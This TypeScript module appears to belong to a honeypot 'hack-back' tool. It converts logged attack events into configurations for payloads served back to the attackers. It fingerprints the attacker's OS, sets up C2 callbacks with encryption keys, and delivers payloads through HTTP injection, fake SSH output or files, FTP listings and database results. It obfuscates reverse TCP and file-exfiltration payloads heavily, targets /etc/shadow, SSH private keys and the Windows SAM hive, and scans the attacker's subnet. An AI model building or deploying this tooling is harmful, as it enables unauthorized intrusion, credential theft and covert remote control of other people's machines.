/**
 * Cookiejar Dough Module
 *
 * The "Dough" represents raw payload configuration - the initial input that
 * defines what kind of payload we want to create and how it should be delivered.
 *
 * This module takes attack events and generates payload configurations that
 * will be processed by the Oven (templates), Bake (obfuscation), and Jar (serving).
 */

import type { AttackEvent, PayloadType, ServiceType } from "../../../lib_deno/types.ts";
import { PayloadType as PT, ServiceType as ST } from "../../../lib_deno/types.ts";

/**
 * Target environment detection based on attack fingerprinting
 */
export interface TargetEnvironment {
  /** Operating system: linux, windows, macos, or unknown */
  os: "linux" | "windows" | "macos" | "unknown";

  /** Shell environment: bash, powershell, cmd, python */
  shell: "bash" | "powershell" | "cmd" | "python" | "sh";

  /** Whether target likely has internet access */
  hasInternet: boolean;

  /** Detected languages/interpreters available */
  detectLanguages: string[];

  /** Browser information (for HTTP attacks) */
  browser?: {
    name: string;
    version: string;
    engine: string;
  };
}

/**
 * C2 (Command & Control) configuration
 */
export interface C2Config {
  /** Full callback URL for C2 server */
  callbackUrl: string;

  /** Unique identifier for this payload deployment */
  payloadId: string;

  /** AES-256 encryption key for secure communications */
  encryptionKey: string;

  /** Maximum number of callbacks allowed */
  maxCallbacks: number;

  /** Payload expiration time in hours */
  expirationHours: number;

  /** HMAC key for payload authentication */
  hmacKey: string;
}

/**
 * Payload delivery configuration
 */
export interface DeliveryConfig {
  /** Delivery method based on attack protocol */
  method: "http_inject" | "http_redirect" | "ssh_output" | "ssh_file" |
          "db_result" | "ftp_file" | "ftp_listing";

  /** Attack-specific context for delivery customization */
  context: {
    /** Attacker's IP address */
    attackerIp: string;

    /** Service type (HTTP, SSH, FTP, etc.) */
    serviceType: string;

    /** Original attack ID for correlation */
    attackId?: number;

    /** User-Agent or SSH banner */
    userAgent?: string;

    /** Request path or command issued */
    requestPath?: string;

    /** Additional metadata */
    [key: string]: any;
  };
}

/**
 * Complete payload configuration ("Dough")
 */
export interface DoughConfig {
  /** Type of payload to generate */
  payloadType: PayloadType;

  /** Target environment characteristics */
  targetEnvironment: TargetEnvironment;

  /** C2 server configuration */
  c2Config: C2Config;

  /** Delivery method configuration */
  delivery: DeliveryConfig;

  /** Obfuscation level: none, light, medium, heavy */
  obfuscationLevel: "none" | "light" | "medium" | "heavy";

  /** Additional payload-specific options */
  options?: {
    /** For network scanners: CIDR to scan */
    scanCidr?: string;

    /** For file exfiltration: target paths */
    targetPaths?: string[];

    /** For reverse TCP: local port to bind */
    bindPort?: number;

    /** Custom payload variables */
    customVars?: Record<string, string>;
  };
}

/**
 * Dough Service - Converts attack events into payload configurations
 */
export class DoughService {
  private c2BaseUrl: string;
  private defaultExpirationHours: number;
  private defaultMaxCallbacks: number;

  constructor(config?: {
    c2BaseUrl?: string;
    defaultExpirationHours?: number;
    defaultMaxCallbacks?: number;
  }) {
    this.c2BaseUrl = config?.c2BaseUrl || "http://localhost:8443";
    this.defaultExpirationHours = config?.defaultExpirationHours || 24;
    this.defaultMaxCallbacks = config?.defaultMaxCallbacks || 100;
  }

  /**
   * Generate payload configuration from an attack event
   */
  fromAttackEvent(
    event: AttackEvent,
    payloadType: PayloadType
  ): DoughConfig {
    const targetEnv = this.detectEnvironment(event);
    const c2Config = this.generateC2Config();
    const delivery = this.selectDeliveryMethod(event);
    const obfuscationLevel = this.selectObfuscationLevel(event, payloadType);

    return {
      payloadType,
      targetEnvironment: targetEnv,
      c2Config,
      delivery,
      obfuscationLevel,
      options: this.generatePayloadOptions(payloadType, event)
    };
  }

  /**
   * Detect target environment from attack fingerprints
   */
  private detectEnvironment(event: AttackEvent): TargetEnvironment {
    const userAgent = event.user_agent || "";
    const serviceType = event.service_type;

    // SSH-based detection
    if (serviceType === ST.SSH) {
      // Parse SSH banner for OS detection
      if (userAgent.includes("Ubuntu") || userAgent.includes("Debian")) {
        return {
          os: "linux",
          shell: "bash",
          hasInternet: true,
          detectLanguages: ["bash", "sh", "python"]
        };
      } else if (userAgent.includes("Windows")) {
        return {
          os: "windows",
          shell: "powershell",
          hasInternet: true,
          detectLanguages: ["powershell", "cmd", "python"]
        };
      } else {
        return {
          os: "linux", // Default assumption for SSH
          shell: "bash",
          hasInternet: true,
          detectLanguages: ["bash", "sh", "python"]
        };
      }
    }

    // HTTP-based detection
    if (serviceType === ST.HTTP || serviceType === ST.HTTPS) {
      const browser = this.parseBrowserFromUserAgent(userAgent);

      // Detect OS from User-Agent
      let os: TargetEnvironment["os"] = "unknown";
      if (userAgent.includes("Windows")) os = "windows";
      else if (userAgent.includes("Mac OS X") || userAgent.includes("Macintosh")) os = "macos";
      else if (userAgent.includes("Linux") || userAgent.includes("X11")) os = "linux";

      return {
        os,
        shell: os === "windows" ? "powershell" : "bash",
        hasInternet: true,
        detectLanguages: ["javascript"], // Browser environment
        browser
      };
    }

    // FTP-based detection
    if (serviceType === ST.FTP || serviceType === ST.SFTP) {
      // FTP clients typically run on various OSes
      return {
        os: "unknown",
        shell: "bash",
        hasInternet: true,
        detectLanguages: ["bash", "sh"]
      };
    }

    // Database-based detection
    if (serviceType === ST.PostgreSQL || serviceType === ST.MySQL || serviceType === ST.MongoDB) {
      return {
        os: "unknown",
        shell: "bash",
        hasInternet: true,
        detectLanguages: ["bash", "python", "javascript"]
      };
    }

    // Default fallback
    return {
      os: "linux",
      shell: "bash",
      hasInternet: true,
      detectLanguages: ["bash", "sh"]
    };
  }

  /**
   * Parse browser information from User-Agent
   */
  private parseBrowserFromUserAgent(userAgent: string): TargetEnvironment["browser"] {
    // Chrome
    if (userAgent.includes("Chrome/")) {
      const version = userAgent.match(/Chrome\/([\d.]+)/)?.[1] || "unknown";
      return { name: "Chrome", version, engine: "Blink" };
    }

    // Firefox
    if (userAgent.includes("Firefox/")) {
      const version = userAgent.match(/Firefox\/([\d.]+)/)?.[1] || "unknown";
      return { name: "Firefox", version, engine: "Gecko" };
    }

    // Safari
    if (userAgent.includes("Safari/") && !userAgent.includes("Chrome")) {
      const version = userAgent.match(/Version\/([\d.]+)/)?.[1] || "unknown";
      return { name: "Safari", version, engine: "WebKit" };
    }

    // Edge
    if (userAgent.includes("Edg/")) {
      const version = userAgent.match(/Edg\/([\d.]+)/)?.[1] || "unknown";
      return { name: "Edge", version, engine: "Blink" };
    }

    return { name: "Unknown", version: "unknown", engine: "unknown" };
  }

  /**
   * Generate C2 configuration with secure credentials
   */
  private generateC2Config(): C2Config {
    const payloadId = crypto.randomUUID();

    // Generate random encryption key (32 bytes for AES-256)
    const encKeyBuffer = new Uint8Array(32);
    crypto.getRandomValues(encKeyBuffer);
    const encryptionKey = Array.from(encKeyBuffer)
      .map(b => b.toString(16).padStart(2, '0'))
      .join('');

    // Generate HMAC key
    const hmacKeyBuffer = new Uint8Array(32);
    crypto.getRandomValues(hmacKeyBuffer);
    const hmacKey = Array.from(hmacKeyBuffer)
      .map(b => b.toString(16).padStart(2, '0'))
      .join('');

    return {
      callbackUrl: this.c2BaseUrl,
      payloadId,
      encryptionKey,
      maxCallbacks: this.defaultMaxCallbacks,
      expirationHours: this.defaultExpirationHours,
      hmacKey
    };
  }

  /**
   * Select appropriate delivery method based on attack protocol
   */
  private selectDeliveryMethod(event: AttackEvent): DeliveryConfig {
    const serviceType = event.service_type;
    const attackerIp = event.source_ip;
    const userAgent = event.user_agent;
    const payload = event.payload;

    // Base context
    const context: DeliveryConfig["context"] = {
      attackerIp,
      serviceType: ST[serviceType] as unknown as string,
      userAgent,
      requestPath: payload
    };

    // HTTP/HTTPS - prefer injection for dynamic responses
    if (serviceType === ST.HTTP || serviceType === ST.HTTPS) {
      // If attacking a fake API or JavaScript endpoint, inject directly
      if (payload.includes("/api/") || payload.includes(".js")) {
        return { method: "http_inject", context };
      }
      // Otherwise use redirect to payload hosting
      return { method: "http_redirect", context };
    }

    // SSH - inject into command output or fake files
    if (serviceType === ST.SSH) {
      // If executing commands, inject into output
      if (payload.includes("ls") || payload.includes("cat") || payload.includes("wget")) {
        return { method: "ssh_output", context: { ...context, command: payload } };
      }
      // Otherwise create fake scripts in filesystem
      return { method: "ssh_file", context };
    }

    // FTP - inject into listings or fake files
    if (serviceType === ST.FTP || serviceType === ST.SFTP) {
      if (payload.includes("LIST") || payload.includes("NLST")) {
        return { method: "ftp_listing", context };
      }
      return { method: "ftp_file", context };
    }

    // Database - inject into query results
    if (serviceType === ST.PostgreSQL || serviceType === ST.MySQL || serviceType === ST.MongoDB) {
      return { method: "db_result", context: { ...context, query: payload } };
    }

    // Default fallback
    return { method: "http_redirect", context };
  }

  /**
   * Select obfuscation level based on threat profile
   */
  private selectObfuscationLevel(
    event: AttackEvent,
    payloadType: PayloadType
  ): DoughConfig["obfuscationLevel"] {
    // High-risk payloads always get heavy obfuscation
    if (payloadType === PT.ReverseTCP || payloadType === PT.FileExfiltration) {
      return "heavy";
    }

    // If attacker shows sophistication (multiple protocols, advanced tools), use heavy
    if (event.fingerprint && event.fingerprint.includes("advanced")) {
      return "heavy";
    }

    // Medium threat attacks get medium obfuscation
    if (event.threat_level >= 5) {
      return "medium";
    }

    // Low-risk reconnaissance payloads can use light obfuscation
    if (payloadType === PT.SystemInfo || payloadType === PT.Beacon) {
      return "light";
    }

    // Default: medium obfuscation
    return "medium";
  }

  /**
   * Generate payload-specific options
   */
  private generatePayloadOptions(
    payloadType: PayloadType,
    event: AttackEvent
  ): DoughConfig["options"] {
    const options: DoughConfig["options"] = {};

    switch (payloadType) {
      case PT.NetworkScanner: {
        // Scan the local subnet
        const attackerOctets = event.source_ip.split('.');
        if (attackerOctets.length === 4) {
          options.scanCidr = `${attackerOctets[0]}.${attackerOctets[1]}.${attackerOctets[2]}.0/24`;
        }
        break;
      }

      case PT.FileExfiltration: {
        // Target common sensitive files based on OS
        options.targetPaths = [
          "/etc/passwd",
          "/etc/shadow",
          "/root/.ssh/id_rsa",
          "/home/*/.ssh/id_rsa",
          "C:\\Windows\\System32\\config\\SAM",
          "C:\\Users\\*\\Desktop\\*"
        ];
        break;
      }

      case PT.ReverseTCP: {
        // Use a random high port
        options.bindPort = 40000 + Math.floor(Math.random() * 10000);
        break;
      }

      case PT.BrowserRecon: {
        // Include canvas fingerprinting and WebGL
        options.customVars = {
          includeCanvas: "true",
          includeWebGL: "true",
          includePlugins: "true"
        };
        break;
      }
    }

    return options;
  }

  /**
   * Validate a DoughConfig for completeness and security
   */
  validateConfig(config: DoughConfig): { valid: boolean; errors: string[] } {
    const errors: string[] = [];

    if (!config.payloadType) {
      errors.push("payloadType is required");
    }

    if (!config.c2Config.payloadId) {
      errors.push("c2Config.payloadId is required");
    }

    if (!config.c2Config.callbackUrl) {
      errors.push("c2Config.callbackUrl is required");
    }

    if (!config.c2Config.encryptionKey || config.c2Config.encryptionKey.length !== 64) {
      errors.push("c2Config.encryptionKey must be 64 hex characters (32 bytes)");
    }

    if (!config.delivery.method) {
      errors.push("delivery.method is required");
    }

    if (!config.delivery.context.attackerIp) {
      errors.push("delivery.context.attackerIp is required");
    }

    // Prohibit destructive payloads
    if (config.payloadType === PT.LogWiper) {
      errors.push("log_wiper payload type is prohibited");
    }

    return {
      valid: errors.length === 0,
      errors
    };
  }
}

// Export types and service
export type { PayloadType } from "../../../lib_deno/types.ts";
